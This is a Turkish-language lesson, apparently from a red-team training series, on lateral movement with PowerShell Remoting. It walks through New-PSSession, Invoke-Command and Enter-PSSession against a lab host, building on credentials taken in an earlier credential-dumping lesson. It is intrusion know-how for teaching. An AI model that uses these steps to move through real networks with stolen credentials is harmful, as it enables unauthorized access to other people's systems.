# Lateral Movement (Yanal Hareket)

Lateral Movement, bir saldırganın bir ağa ilk kez sızdıktan sonra, elde ettiği bu başlangıçtaki erişimi kullanarak ağın diğer bölümlerine, diğer sistemlere ve nihai hedeflerine doğru ilerlemesi sürecidir. Bu süreçte Powershell Remoting kullanılır.

&nbsp;

## Powershell Remoting (Uzaktan İletişim)

PowerShell Remoting (Uzaktan İletişim), windows sistemlerini uzaktan yönetmek için kullanılan bir özelliktir. Windows Remote Management (WinRM) protokolünü kullanarak çalışır ve genellikle HTTP için TCP 5985, HTTPS için ise TCP 5986 numaralı portları dinler.

&nbsp;

### Adım 1 | Kalıcı Oturum Oluşturma

Bir önceki **credential-dumping.md** dosyasında "user" kullanıcısı gibi davranarak yanal erişim yapabildiğimiz makinaları listelemiştik. bu makinalar arasında **app-server** makinasına remote access yapmayı deneyeceğiz.

Ayrıca **credential-dumping.md** dosyasında çalıştırdığımız en son komutun sonucunda yeni bir powershell konsolu açılmış olması gerekir. Bu konsolu kullanarak;

```
$session = New-PSSession -ComputerName app-server -verbose
```

Komutu, PowerShell Remoting bağlamında uzak bir bilgisayar ile kalıcı bir PowerShell oturumu (session) oluşturmak için kullanılır. Buradaki `$session` değişkenine bir oturum atadık. Şimdi Bu oturumu okuyalım;

```
$session
```

**Çıktı:** 

```
ID Name: X SessionX

ComputerName: app-server

ComputerType: RemoteMachine

State: Opened

ConfigurationName: Microsoft.PowerShell

Availability: Available

```

&nbsp;

### Adım 2 | Erişilen Makine Üzerinden Komut Çalıştırma

```
Invoke-Command -session $session -ScriptBlock {whoami; ipconfig} -verbose
```

komutu, özetle, daha önce `app-server` adlı uzak sunucu ile kurduğumuz kalıcı PowerShell oturumu ($session) üzerinden, o sunucuda `whoami` ve `ipconfig` komutlarını çalıştırmak ve bu işlemler sırasında daha fazla ayrıntı göstermek için kullanılır.

&nbsp;

### Adım 3 | Erişilen Makine İle İnteraktif İletişim Kurma

Artık makinada komut çalıştırabiliyoruz fakat bu yetmez. Bu makinaya sanki o makinanın klavyesinin başındaymışız gibi komut girmek için;

```
Enter-PSSession -Session $session -Verbose
```

**Çıktı**
`[app-server]: PS C:\Users\user\Documents> _` Yani sanki app-server isimli makinanın ps konsolundaymışz gibi.

---

**NOT: Bir sonraki ders explation.md dosyasıdır.**
